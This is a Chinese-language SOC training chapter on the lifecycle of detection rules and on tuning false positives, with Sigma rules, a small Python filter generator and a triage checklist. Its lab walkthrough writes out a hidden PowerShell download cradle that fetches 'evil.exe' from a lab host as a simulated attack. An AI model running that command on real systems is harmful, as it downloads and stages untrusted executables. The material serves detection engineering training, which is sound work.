# 17.4 偵測規則生命週期與誤判除錯 (Detection Rule Lifecycle & FP Tuning)

## 🚨 案發現場破題 (Incident Scenario & Mental Workflow)

週一上午 09:15，企業 SOC 監控中心的 SIEM 平台瞬間被超過 15,000 筆高優先級（High / Critical）告警淹沒，告警鈴聲震耳欲聾。儀表板上顯示的全部是同一條規則：`SOC-RULE-2026-089: Mimikatz LSASS Memory Dumping via Sysmon Event ID 10`。

一線分析師驚慌失措地開始拔除受害主機網路線，正準備向 CISO 匯報發生了全網橫向移動慘劇。然而，深入日誌細查後，資深應變人員發現這 15,000 筆告警的發起者，竟然是企業 IT 剛剛透過 SCCM 在全域推送升級的微軟官方終端防護更新程式 `MsMpEng.exe`，以及合法的資產清點軟體！

這是一起典型的**「告警風暴（Alert Fatigue）與規則誤報爆炸」**事故。不成熟、未經驗證的偵測規則直接上線生產環境，會造成一線分析師認知過載、淹沒真實攻擊、甚至導致業務系統遭到錯誤隔離而癱瘓。

「寫出規則只佔 20%，維護與除錯佔 80%。」現代藍軍偵測工程團隊的專業分水嶺，在於是否建立了**工業級的偵測規則生命週期管理（Detection-as-Code / CI-CD）與科學化的誤判除錯（Tuning）標準**。

偵測工程師的標準生命週期心智模型：
1. **需求與假設提出（Requirements & Hypothesis）**：依據威脅情資（CTI）或紅隊演練發現防禦盲區，提出明確可證偽的偵測假設。
2. **基線分析與歷史回溯（Historical Baseline Testing）**：將新規則放入過去 30 到 90 天的真實生產環境歷史日誌中回溯（Backtesting），評估觸發次數與潛在誤報率。
3. **金絲雀灰度發布（Staging / Canary Deployment）**：新規則嚴禁直接設為 `Alert / Block`，必須先置於「靜默觀察模式（Silent / Audit Mode）」，在測試群組中驗證 7 到 14 天。
4. **精確白名單微創除錯（Negative Filter Tuning）**：針對誤報項目，堅決不降低原始特徵閾值，而是採用「最小特權欄位組合」（如 `ParentImage + CommandLine + User` 三位一體）建立外科手術式的排除規則。
5. **退役與日落機制（Rule Deprecation & Sunset）**：定期審查過時攻擊手法、已被底層安全補丁覆蓋的舊規則，及時下架，維持 SIEM 引擎輕量高效。

```

                                       │
                                       ▼

                                       │
                                       ▼
┌─────────────────────────────────────────────────────────────────────┐
```

## 🧩 第一動：底層機制/協定解剖 (Mechanics & Physical Structs)

### 1. 偵測工程生命週期狀態機 (Rule Lifecycle State Machine)

一份成熟的企業級偵測規則，在代碼庫中必須經歷嚴格的狀態流轉（State Machine），禁止任意跳級發布：

```text
[Draft (草稿態)] ──► [Testing (測試態)] ──► [Staging (預發/觀察態)] ──► [Production (生產態)]
                                                                               │
                                                                               ▼
                                                                     [Deprecated (廢棄/歸檔態)]
```

- **Draft（草稿）**：工程師剛寫出的初步規則，僅在本地或實驗室環境完成基本語法校驗（Schema Linting）。
- **Testing（測試）**：在開發用 SIEM 實例中，注入紅隊攻擊腳本或歷史惡意樣本，確認**真陽性（True Positive）捕獲率 100%**。
- **Staging / Canary（預發 / 靜默觀察）**：規則部署至生產環境，但其動作被強制覆蓋為 `tag: audit_only`，不向一線 SOC 產生工單，專門用來收集合法業務的邊界碰撞。
- **Production（正式生產）**：通過為期 14 天的靜默觀察且無未授權碰撞後，經 Detection Review Board 批准，切換為實時告警（High / Critical）。
- **Deprecated（廢棄）**：當偵測的 CVE 已全網修補完畢，或端點已升級不相容之架構時，規則移入 Archive 歸檔，停止在 SIEM 中排程運算。

### 2. 誤報產生的底層數學模型與混淆矩陣 (Confusion Matrix)

在評估規則品質時，藍軍偵測工程師依靠統計學混淆矩陣進行量化評估：

```text
                       [ 真實世界情況 (Ground Truth) ]
                       惡意攻擊 (Malicious)     正常業務 (Benign)
      ┌───────────────┬──────────────────────┬──────────────────────┐
      │ 告警 (Alert)  │ 真陽性 (TP)          │ 偽陽性/誤報 (FP)     │
[預測]│               │ 【精準捕獲黑客】     │ 【引發警報疲勞-需調優】│
      ├───────────────┼──────────────────────┼──────────────────────┤
      │ 靜默 (Silent) │ 偽陰性/漏報 (FN)     │ 真陰性 (TN)          │
      │               │ 【極度危險！防禦盲區】│ 【正常放行業務】     │
      └───────────────┴──────────────────────┴──────────────────────┘
```

#### 核心指標計算公式：
- **精確率 (Precision)**：`Precision = TP / (TP + FP)`
  - 代表「**告警響起時，真的是黑客的機率是多少？**」生產環境規則要求 Precision > 90%，否則 SOC 會陷入狼來了效應。
- **召回率 (Recall)**：`Recall = TP / (TP + FN)`
  - 代表「**黑客進來時，我們能抓住多少？**」高風險重大威脅（如域控提權）追求高 Recall。

### 3. 微創白名單（Surgical Whitelisting）的三維約束法

當規則命中合法業務時，初級工程師常犯的致命錯誤是直接放寬規則，例如：
> ❌ **錯誤調優**：將 `CommandLine|contains: 'powershell -enc'` 改為只要包含某單詞就不報。攻擊者只要在命令列後面隨意加上該單詞即可瞬間免殺！

藍軍必須堅持**三維立體約束（The Trinity of Process Whitelisting）**，排除條件必須同時滿足三個維度，攻擊者才無法輕易偽造：

```text
       [ 維度 1：行程與父行程身分 (Who & Parent) ]
       User: "NT AUTHORITY\SYSTEM"
       ParentImage: "C:\Program Files\IT_Tools\agent.exe"
                         │
                         ├──────► 【三者交集方可排除 (AND)】
                         │        (缺一不可，阻斷攻擊者利用注入偽裝)
       [ 維度 2：二進位簽名與雜湊 (Binary Authenticity) ]
       Signer: "Microsoft Corporation"
       OriginalFileName: "TrustedAgent.exe"
                         │
       [ 維度 3：嚴格受限之命令行 (Strict Command Parameters) ]
       CommandLine: "trusted_agent.exe -sync -silent"
```

### 2. 生產級規則調優實戰範例：從粗糙到極致微創

#### 原始粗糙規則（高誤報版）
```yaml
# ❌ 初始未調優版本：單純偵測 whoami.exe，一週引發 5,000 次開發與腳本誤報！
title: 偵測使用者枚舉行為 (Whoami)
detection:
    selection:
        Image|endswith: '\whoami.exe'
    condition: selection
level: medium
```

#### 工業級調優升級版本（微創高精準版）
建立檔案 `/etc/sigma/rules/proc_creation_win_whoami_tuned.yml`：

```yaml
title: 偵測非典型互動式使用者枚舉 (Whoami Discovery)
id: d7f00001-55bb-4aa1-cc88-88c2b8000001
status: production
description: 攻擊者常於取得 Webshell 或初始立足點後，利用 whoami.exe 探測當前權限。本規則嚴格排除系統服務與合法開發工具，僅鎖定由可疑父進程衍生的枚舉行為。
references:
    - https://attack.mitre.org/techniques/T1033/
author: SOC_Detection_Engineering
date: 2026-09-12
tags:
    - attack.discovery
    - attack.t1033

logsource:
    category: process_creation
    product: windows

detection:
    selection:
        - Image|endswith: '\whoami.exe'
        - OriginalFileName: 'whoami.exe'

    # 鎖定高危父進程 (Suspicious Parents: 腳本引擎、Web 容器、Office)
    suspicious_parents:
        ParentImage|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\w3wp.exe'
            - '\httpd.exe'
            - '\nginx.exe'
            - '\sqlservr.exe'

    # 微創白名單 1：排除特定維運軟體自動化腳本 (三位一體約束)
    filter_admin_agent:
        ParentImage|endswith: 'C:\Program Files\EnterpriseAdmin\AdminAgent.exe'
        CommandLine|contains: 'whoami /groups'
        User: 'NT AUTHORITY\SYSTEM'

    # 微創白名單 2：排除合法的 Visual Studio 開發編譯器進程衍生
    filter_vs_build:
        ParentImage|contains: 'C:\Program Files\Microsoft Visual Studio\'
        CommandLine: 'whoami'

    condition: selection and suspicious_parents and not (1 of filter_*)

falsepositives:
    - 系統管理員在日常排障時主動開啟 CMD 手動輸入 whoami（建議此類操作由跳板機堡壘審計記錄）
level: high
```

### 3. 自動化白名單生成器 (Python Tuning Assistant)

```python
#!/usr/bin/env python3
# 藍隊工具：讀取 SIEM 誤報日誌，自動萃取三維過濾特徵並產出 Sigma Filter 區塊

import sys
import json
from collections import Counter

def generate_tuning_filter(log_entries):
    print("[*] Analyzing False Positive logs to generate surgical filter...")
    
    parents = Counter()
    users = Counter()
    
    for entry in log_entries:
        parent = entry.get("ParentImage") or entry.get("parent_process", "")
        user = entry.get("User") or entry.get("user_name", "")
        if parent: parents[parent] += 1
        if user: users[user] += 1
        
    top_parent, p_count = parents.most_common(1)[0]
    top_user, u_count = users.most_common(1)[0]
    
    print(f"[+] Discovered predominant benign pattern ({p_count} occurrences):")
    print(f"    Parent: {top_parent}")
    print(f"    User  : {top_user}\n")
    
    yaml_filter = (
        "    filter_autotuned_benign:\n"
        f"        ParentImage: '{top_parent}'\n"
        f"        User: '{top_user}'\n"
    )
    print("=== Copy the following snippet into your Sigma 'detection' block ===")
    print(yaml_filter)
    print("====================================================================")

if __name__ == "__main__":
    sample_fps = [
        {"ParentImage": "C:\\Program Files\\Monitoring\\agent.exe", "User": "NT AUTHORITY\\SYSTEM"},
        {"ParentImage": "C:\\Program Files\\Monitoring\\agent.exe", "User": "NT AUTHORITY\\SYSTEM"},
        {"ParentImage": "C:\\Program Files\\Monitoring\\agent.exe", "User": "NT AUTHORITY\\SYSTEM"}
    ]
    generate_tuning_filter(sample_fps)
```

## ⚖️ 第四動：研判分水嶺——真實威脅 vs 業務誤報

### SOC 研判核心問題表

| 核心提問（研判維度） | 本技術點實戰檢核標準 |
| :--- | :--- |
| **Q1：觸發告警的終端資產角色為何（業務環境分類）？** | 區分資產分區：若觸發於「研發測試網段（Dev/QA）」，軟體頻繁調用非典型指令屬常態；若觸發於「生產資料庫（Prod-DB）」或「網域控制站（DC）」，**任何異常指令即刻視為真實入侵**！ |
| **Q2：發起該行為的使用者是否具備合理的日常維運授權？** | 查詢企業內部工單系統（ServiceNow / Jira）。在該告警時間點，是否登記有緊急變更維護（CR - Change Request）？操作帳號是否登記在當班維運排班表上？ |
| **Q3：此操作是否在全網成百上千台主機上同時觸發？** | 這是判定是否為「集中派發誤報」的關鍵指標！若 10 分鐘內全網 2,000 台端點同時觸發相同告警，**99.9% 是集中更新、防毒庫升級或組態原則推送**；真實黑客攻擊通常為點對點突破。 |
| **Q4：該行程的執行檔案是否有合法權威的數位簽名（Authenticode）？** | 檢驗簽章狀態：執行檔是否具備 `Microsoft Windows Publisher`、`Google LLC` 等權威 CA 簽發之有效數位簽章？且該二進位檔雜湊值是否與微軟官方發行一致？ |
| **Q5：該行程在呼叫前是否有外部非典型檔案的寫入行為？** | 檢查 Sysmon Event ID 11（FileCreate）。該執行檔是長年存放於目錄中，還是剛剛在 30 秒前由瀏覽器快取、Word 暫存或臨時目錄建立落地？新寫入即執行必屬高危。 |
| **Q6：白名單排除規則是否違反了「最小特權範圍」原則？** | 審查現有過濾邏輯：是否有人偷懶寫了 `CommandLine|contains: '.exe'` 或 `ParentImage|contains: 'cmd'` 這種通配全域的「天窗」？若有，需判定該白名單已遭污染，必須立即撤銷並重構。 |
| **Q7：執行參數中是否存在意圖規避審計的異常語法結構？** | 檢查字串特徵：雖然命中業務進程，但參數中是否包含 Base64 載荷、異常環境變數替換（如 `%COMSPEC%`）、反引號或不可見字元？若有，屬於利用合法進程掩護的真實攻擊。 |
| **Q8：該規則在測試期間的 Precision（精確率）評估是否達標？** | 調閱該規則在 Staging 階段的指標：在過去 14 天內，告警總數中被確認為真實威脅的比例是否大於 80%？若精確率低於 50%，堅決不允許晉升至生產告警隊列。 |

## 🛡️ 第五動：處置圍堵與系統加固 SOP

### 1. 規則誤報引發警報風暴之緊急處置指南

當生產環境因不成熟規則引發告警風暴時，嚴格依照以下降噪 SOP 處置：

```bash
# 步驟 1：立即在 SIEM 中暫停該告警規則的通知通道 (Disable Alert Action)
# 例如在 Splunk 中將 savedsearch 的 is_scheduled 改為 0，或靜音 (Mute) 該告警 2 小時
curl -k -u admin:password https://splunk.corp.local:8089/servicesNS/admin/search/saved/searches/SOC-RULE-2026-089 -d is_scheduled=0

# 步驟 2：從 Git 倉庫檢出規則源碼，建立急救修復分支 (Hotfix Branch)
git checkout -b hotfix/tuning-rule-089
# 編輯規則 YAML，加入臨時抑制條目 (Temporary Suppression)

# 步驟 3：在代碼審計後，透過 CI/CD 快速推送覆蓋生產規則
sigma convert -t splunk -p sysmon /etc/sigma/rules/hotfix_rule.yml > /tmp/hotfix.spl
# 驗證 SPL 語法後重載排程

# 步驟 4：事後向一線分析師同步說明，避免人工重複處理同一批歷史誤報工單
```

### 2. 偵測工程 CI/CD 與代碼化防禦體系（Detection-as-Code Pipeline）

要從制度上消滅誤報，必須將偵測規則納入軟體工程的 DevOps 流水線：

1. **GitHub / GitLab 集中版本控管**：所有 Sigma 與 YARA 規則必須存放於 Git 專案中，禁止工程師直接在 SIEM Web 介面隨意新增或修改查詢語句。
2. **自動化 Pull Request（PR）門禁審查**：
   - **Linter 測試**：語法必須 100% 符合 Sigma 2.0 規範。
   - **Unit Test 測試**：自動注入預先準備好的測試 JSON 日誌，必須且僅能命中預期的測試案例。
   - **Peer Review 雙人審查**：必須有另一位資深偵測工程師代碼評審（LGTM）方可合併。
3. **金絲雀自動發布器**：合併至主分支後，自動化腳本將規則編譯並推送到 SIEM 的 `Audit_Index`，運行 14 天無誤報後，自動調高權限至 `Production_Alert_Index`。

## 🎯 靶場實戰檢驗 (Hands-on Lab Walkthrough)

### 靶場環境說明
- **SIEM 平台**：Elasticsearch + Kibana 或 Splunk。
- **作戰任務**：面對一條初版「偵測 PowerShell 下載」的高誤報規則，在靶機注入攻擊與合法業務日誌，完成「誤報分析 ➔ 撰寫三維 Filter ➔ 驗證零誤報」的調優閉環。

### 實戰驗證步驟

#### 步驟 1：部署初版粗糙規則
初版規則定義：
```yaml
title: Download File via PowerShell
detection:
    selection:
        CommandLine|contains: 'DownloadFile'
    condition: selection
```
轉譯為查詢並執行，發現歷史日誌命中 48 筆，其中 47 筆為 IT 備份工具 `BackupManager.ps1` 的每日備份日誌，僅 1 筆為黑客下載木馬的真實攻擊。

#### 步驟 2：分析誤報特徵（Extracting FP Signatures）
檢視 47 筆合法誤報日誌，提取出共同指紋：
- `ParentImage`：`C:\Program Files\EnterpriseBackup\BackupService.exe`
- `ScriptBlockText` 或 `CommandLine`：精確包含 `-ConfigFile "C:\Backup\config.json"`
- `User`：`NT AUTHORITY\SYSTEM`

#### 步驟 3：升級規則（實施外科手術式排除）
修改規則加入多維排除：
```yaml
title: Suspicious PowerShell DownloadFile Invocations
detection:
    selection:
        CommandLine|contains: 'DownloadFile'
    filter_backup:
        ParentImage: 'C:\Program Files\EnterpriseBackup\BackupService.exe'
        CommandLine|contains: '-ConfigFile'
        User: 'NT AUTHORITY\SYSTEM'
    condition: selection and not filter_backup
```

#### 步驟 4：在靶機引爆對照測試
在 Windows 測試機執行兩組指令：
```powershell
# 1. 模擬合法備份操作 (預期結果：不觸發告警)
# (以模擬參數調用)
# 2. 模擬攻擊者惡意下載 (預期結果：精確觸發告警！)
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile('http://192.168.56.101/evil.exe', 'C:\Windows\Temp\update.exe')"
```

#### 步驟 5：驗證檢測結果
在 SIEM 檢索結果中：
- 合法備份操作被 Filter 成功靜音，告警數為 **0**。
- 惡意下載指令被精確抓獲，觸發 **1** 筆 High 告警！
**調優驗證成功**：在完美保留對黑客攻擊檢測能力的同時，將業務誤報率徹底降為 0%！

## 📋 過關驗收檢查點 (Mastery Checklist)

- [ ] **Q1：在偵測工程中，為什麼「Precision（精確率）」太低會導致整座 SOC 監控體系事實上癱瘓？**
  - *驗收標準*：答出當精確率低時，會產生嚴重的「警報疲勞（Alert Fatigue）」。一線分析師每天面對數千筆無害誤報，大腦會產生麻木效應，下意識將所有告警標記為已處理或關閉，導致真正的微量黑客攻擊直接被淹沒漏檢。
- [ ] **Q2：什麼是「Detection as Code（代碼化偵測）」？它與傳統管理員直接在 SIEM 介面上手動保存搜尋（Saved Search）有何本質區別？**
  - *驗收標準*：答出 Detection as Code 將所有檢測規則以程式碼（如 Sigma YAML）集中在 Git 倉庫管理，透過 CI/CD 進行版本控制、自動化單元測試、同儕代碼審查與跨平臺轉譯部署；而手動在 SIEM 寫死規則無法追溯歷史變更、缺乏測試流程，且極易因單點故障或誤操作導致規則遺失或語法崩潰。
- [ ] **Q3：在微創白名單除錯（Surgical Whitelisting）中，為什麼單純排除「檔案名稱（如 `Image|endswith: agent.exe`）」是極度危險的做法？**
  - *驗收標準*：答出攻擊者可以輕易將其惡意木馬改名為 `agent.exe`，或者直接在攻擊命令列中偽造同名參數，從而直接落入白名單盲區獲得完全免殺。必須結合父進程路徑、完整簽署者憑證與固定參數實施多維約束。
- [ ] **Q4：在規則生命週期中，「Staging / Canary（預發/靜默觀察態）」階段的核心任務是什麼？通常需要維持多久時間？**
  - *驗收標準*：答出其任務是將新規則在不發送實際告警給 SOC 的前提下，於真實生產日誌環境中靜默運算，觀察其在日常業務中的觸發頻率與潛在誤報模式，以供工程師進行白名單優化。通常需要維持 7 到 14 天，以完整覆蓋業務的週中交易高峰與週末批處理維運週期。
- [ ] **Q5：什麼是偵測規則的「功能性衰退（Detection Decay）」？請列舉兩個導致規則衰退的典型物理成因。**
  - *驗收標準*：答出 Detection Decay 指一條原本有效的規則隨時間推移逐漸喪失偵測能力。典型成因包括：(1) 目標作業系統升級導致日誌 Event ID 或欄位結構改變（如 Windows 早期 592 改為現代 4688）；(2) 攻擊者改變了戰術手法（如改用更隱蔽的 API 調用或新編碼技術繞過特定關鍵字）。
